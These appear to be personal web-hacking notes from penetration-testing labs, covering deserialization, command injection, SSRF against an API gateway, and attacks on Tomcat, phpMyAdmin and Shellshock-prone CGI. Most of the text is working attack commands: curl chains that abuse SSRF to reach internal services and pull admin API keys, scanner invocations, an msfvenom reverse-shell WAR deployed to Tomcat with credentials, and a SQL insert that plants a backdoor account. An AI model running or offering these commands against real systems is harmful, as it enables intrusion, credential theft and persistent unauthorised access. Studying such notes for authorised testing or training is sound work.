    https://klezvirus.github.io/Advanced-Web-Hacking/Serialisation/
    Look for untrusted data that's being deserialized; look for something being serialized or deserialized that you can control the type of, or its data
    Method 1: transmitted object that you can edit
    Method 2: stored object that you can edit
    Look for base64-encoded objects! - serialized objects in transit that can be modified - check known signatures         
    Process: study the source code to identify a class that contains a magic method that is invoked during deserialization. Assess the code that this magic method executes to see if it directly does anything dangerous with user-controllable attributes
        Study any methods the kick-off gadget invokes--anything dangerous w/ data I control? - keep following
        After finding a vulnerability in the code, look for functions you can take advantage of (download, write, etc.) (or use a known gadget)
    **Trial & Error w/ Payloads
    ***Can lead to RCE, auth bypass (type juggling), SQL injection, etc.
    Troubleshooting: Test different payloads (sleep, ping, nc, etc.), different encodings/escapes, etc.
    3 Conditions:
        The serialized object is provided by or can be modified by a user.
        An application attempts to deserialize and use the object without validation.
        The object is deserialized by a portion of the application with valuable libraries in the "class path".
    Monitoring for Ping Payload Success:  sudo tcpdump -i tun0 'icmp and host <tgt ip>' 

## Websockets:

    Step 1: Figure out how the socket is initiated and connect to it
    Step 2: Figure out what commands are allowed (code review, fuzzing, etc.)

## Command Injection:

    ; & && | || > < `...` $(...)  -  URL encode
    Try sub-commands if you control input! - ex. $(whoami)

## SSRF:
    https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery
    API Gateway Steps:
        *See APIGateway scripts 
        -Discovery & enumeration of API microservices
        -Bypass gateway to call service endpoints directly; enumerate endpoints!
        -Enumerate, gather info/bypass auth, and find RCE method
    Any time an API or web form includes a url parameter, always test for SSRF!
        Test kali URL (check request headers), then test localhost & internal endpoints & enumerate        
    Understand what types of requests cause different HTTP request codes and error messages! - necessary for blind enumeration
    Look up default ports for services and test connectivity!
    Identify as many error messages as possible - try invalid ips/ports, malformed ips/ports, your ip, internal ips, etc.
    Microservices don't implement access controls independently - if we can bypass the gateway, we could subvert the controls
        IP addresses are often dynamic, communicating by resolving each Docker container name instead - internal URLs!
        Each microservice exposes its functionality via an API
        API Gateway: single point of entry to the ecosystem
        URLs are often analyzed with regex to route to the correct internal endpoint
        *URL of the backend service might not match the URL the API gateway exposes
    RESTful APIs often perform different actions based on the request type - test different ones!
    URLs for RESTful APIs often follow a pattern of <object>/<action> or <object>/<identifier>
    Map it out! - boxes, IPs, services, endpoints, ports
    After enumerating internal IPs & ports, figure out which service/external endpoint url maps to each - then try fuzzing parameters
    ex. Try sending a request to the Admin API endpoint that returns API keys - then use that at another endpoint
    ex. Call internal endpoint (APIGateway):  
        curl -i -X POST -H "Content-Type: application/json" -d '{"url":"http://172.16.19.9:9000/render"}' http://192.168.1.135:8000/files/import
        Testing: curl -i -X POST -H "Content-Type: application/json" -d '{"url":"http://172.16.19.9:9000/api/render?url=http://192.168.111.1/hello.html"}' http://192.168.1.135:8000/files/import
        Calling admin API: curl -X POST -H "Content-Type: application/json" -d '{"url":"http://172.16.19.9:9000/api/render?url=http://192.168.111.1/exfil.html"}' http://192.168.1.135:8000/files/import
        Calling admin API key endpoint:  curl -X POST -H "Content-Type: application/json" -d '{"url":"http://172.16.19.9:9000/api/render?url=http://192.168.111.1/exfil2.html"}' http://192.168.1.135:8000/files/import
        Now we can call the /render endpoint directly without SSRF:
            curl -i -X POST -H "Content-Type: application/json" -d '{"apikey":"blah"}' http://192.168.1.135:8000/render
            curl -i -X POST -H "apikey: blah" http://192.168.1.135:8000/render
            curl -i -X POST -H "apikey: blah" -H "Content-Type: application/json" -d '{"url":"http://192.168.111.1/render/url"}' http://192.168.1.135:8000/render --output out.pdf
                Or:  curl "http://192.168.1.135:8000/render?url=http://192.168.111.1/render/url&apikey=blah"
            curl -i -X POST -H "apikey: blah" -H "Content-Type: application/json" -d '{"url":"http://172.16.16.5:8001/key-auths"}' http://192.168.1.135:8000/render --output out.pdf
            Can't call local files:  curl "http://192.168.1.135:8000/render?url=file:///etc/passwd&apikey=blah"
    Exploitation Example w/ Custom Scripts:
        Fuzzing API Gateway Endpoints by Verb and Method (using 3 known endpoints):
            python3 route_buster.py -a /usr/share/wordlists/dirb/small.txt -w endpoints_simple.txt -t http://192.168.169.135:8000
            python3 route_buster_multi.py -a /usr/share/wordlists/dirb/small.txt -w endpoints_simple.txt -t http://192.168.169.135:8000
        Using Vulnerable URL Parameter of Discovered API Endpoint:
            Internal Network Discovery - Port Scanning (based on error codes): Test different IPs, starting w/ localhost
                Localhost:  python3 ssrf_port_scanner.py -t http://192.168.169.135:8000/files/import -s http://localhost --timeout 5
                Or list of IPs:  python3 ssrf_port_scanner.py -t http://192.168.169.135:8000/files/import -sf ssrfIPs.txt --timeout 5
            Target Discovery - Subnet Scanning Gateways (based on latency) - using common IP ranges:
                POC - benchmark request time:  curl -X POST -H "Content-Type: application/json" -d '{"url":"http://127.0.0.1:6666"}' http://apigateway:8000/files/import -s -w 'Total: %{time_total} microseconds\n' -o /dev/null
                Port is arbitrary - only the response time matters
                python3 ssrf_gateway_isalive_scanner.py -t http://192.168.169.135:8000/files/import
                    Then modify to scan the discovered subnet for hosts:
                        python3 ssrf_subnet_isalive_scanner.py -t http://192.168.169.135:8000/files/import
                Or scan by hostname:  python3 ssrf_hostname_scanner.py -t http://192.168.169.135:8000/files/import
            Target Enumeration - port scan specific hosts in a subnet (after scanning the whole subnet - based on error codes):
                python3 ssrf_port_subnet_scanner.py -t http://192.168.169.135:8000/files/import --timeout 5
            Example Error Code Responses:
                500 Internal Server Error with "ECONNREFUSED" message: Host up, port closed
                500 Internal Server Error with "status code 404" message: Host up, port open, invalid resource
                403 Forbidden with "FORBIDDEN" message: Host up, port open, valid resource
            After enumerating internal IPs & ports, figure out which service/external endpoint url maps to each
            Call Internal Endpoint:  curl -i -X POST -H "Content-Type: application/json" -d '{"url":"http://172.16.16.2:9000/render"}' http://192.168.169.135:8000/files/import
            Fuzzing Internal Endpoint URL Path (using variations of external):
                python3 ssrf_path_scanner.py -t http://192.168.169.135:8000/files/import -s http://172.16.16.2:9000 -p paths.txt --timeout 5
                Fuzzing URL parameters:  python3 ssrf_path_scanner.py -t http://192.168.169.135:8000/files/import -s http://172.16.16.2:9000/api/render -p paths2.txt --timeout 5

## API Tips:

    Check the documentation! - look at example requests
    Exploits: XXE, CORS/CSRF, etc.
    Pay attention to CORS headers - non-standard types (e.g. application/json) may not be exploitable with standard headers
    ex. Starting a process/flow by uploading a .yml file with a Groovy/Python/Ruby reverse shell
    See if API authentication (or app login) is possible with a key
    Look for hardcoded keys - migration files, supporting files, etc.
    Look for API endpoint that returns keys - check documentation
    Look at plugin access - check their documentation/features - references to process execution - create payload in the plugin's language

## Specific Applications/Vulnerabilities:  

	PHPMyAdmin:
		in sql console:  select * from webappdb.users;
		make a user:  insert into webappdb.users(password, username) VALUES (”backdoor“,”backdoor“);
	Tomcat Web Application Manger War Shell Upload:
		msfvenom -p java/shell_reverse_tcp lhost=10.10.14.18 lport=4444 -f war -o pwn.war
		***: curl -T "pwn.war" -u 'tomcat:$3cureP4s5w0rd123!' "http://10.10.10.194:8080/manager/text/deploy?path=/miao&update=true"
		Or automate with:  https://github.com/mgeeky/tomcatWarDeployer
		python autowar.py http://10.10.10.95:8080 -U tomcat -P s3cret -H <attacking machine IP> -P 4321
	CGI-BIN Directory: look for .sh scripts (Shellshock vulnerability):
		dirb http://10.10.10.56/cgi-bin -X .sh
